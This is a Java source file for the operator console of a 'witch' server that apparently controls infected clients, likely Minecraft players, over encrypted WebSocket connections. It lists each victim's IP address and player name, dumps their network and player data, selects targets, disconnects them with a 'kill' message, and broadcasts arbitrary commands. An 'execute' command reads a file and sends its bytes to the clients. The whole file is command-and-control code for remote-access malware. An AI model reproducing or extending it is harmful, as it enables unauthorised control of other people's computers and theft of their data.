package me.soda.witch.server.handlers;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import me.soda.witch.server.server.Message;
import me.soda.witch.server.server.Server;
import org.java_websocket.WebSocket;

import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.List;

public class CommandHandler {
    private static final Gson GSON = new Gson();
    private static List<WebSocket> connCollection;
    private static boolean all = true;

    private void tryBroadcast(Server server, String messageType, Object... object) {
        String json = GSON.toJson(object);
        tryBroadcast(server, new Message(messageType, json));
    }

    private void tryBroadcast(Server server, Message message) {
        if (all) {
            server.getConnections().forEach(conn -> conn.send(server.clientMap.get(conn).encrypt(message, server)));
        } else {
            connCollection.forEach(conn -> conn.send(server.clientMap.get(conn).encrypt(message, server)));
        }
    }

    public boolean handle(String in, Server server) {
        boolean stop = false;
        String[] msgArr = in.split(" ");
        if (msgArr.length > 0) {
            try {
                switch (msgArr[0]) {
                    case "stop" -> {
                        server.stop();
                        stop = true;
                    }
                    case "conn" -> {
                        if (msgArr.length == 1) {
                            server.log("----CONNECTIONS----");
                            server.getConnections().forEach(conn -> {
                                int index = conn.<Integer>getAttachment();
                                JsonObject jsonObject = server.clientMap.get(conn).playerData;
                                server.log(String.format("IP: %s, ID: %s, Player:%s",
                                        jsonObject.getAsJsonObject("ip").get("ip").getAsString(),
                                        index, jsonObject.get("playerName").getAsString()));
                            });
                        } else if (msgArr.length == 3) {
                            switch (msgArr[1]) {
                                case "net" -> server.getConnections().stream().filter(conn ->
                                                conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
                                        .forEach(conn -> server.log(String.format("ID: %s, Network info: %s ", msgArr[2],
                                                server.clientMap.get(conn).playerData.getAsJsonObject("ip").toString()
                                        )));
                                case "player" -> server.getConnections().stream().filter(conn ->
                                                conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
                                        .forEach(conn -> server.log(String.format("ID: %s, Player info: %s ", msgArr[2],
                                                server.clientMap.get(conn).playerData.toString()
                                        )));
                                case "sel" -> {
                                    connCollection = new ArrayList<>();
                                    if (msgArr[2].equals("all")) {
                                        all = true;
                                        server.log("Selected all clients!");
                                        break;
                                    }
                                    server.getConnections().stream().filter(conn ->
                                                    conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
                                            .forEach(conn -> connCollection.add(conn));
                                    server.log("Selected client!");
                                }
                                case "disconnect" -> {
                                    server.getConnections().stream().filter(conn ->
                                                    conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
                                            .forEach(conn -> conn.send("kill"));
                                    server.log("Client " + msgArr[2] + " disconnected");
                                }
                                default -> {
                                }
                            }
                        }
                    }
                    case "execute" -> {
                        if (msgArr.length < 2) break;
                        String[] strArr = new String[msgArr.length - 1];
                        System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
                        File file = new File(String.join(" ", strArr));
                        FileInputStream is = new FileInputStream(file);
                        tryBroadcast(server, msgArr[0], is.readAllBytes());
                        is.close();
                    }
                    default -> {
                        if (msgArr.length >= 2) {
                            String[] strArr = new String[msgArr.length - 1];
                            System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
                            tryBroadcast(server, msgArr[0], String.join(" ", strArr));
                        } else {
                            tryBroadcast(server, msgArr[0]);
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return stop;
    }
}
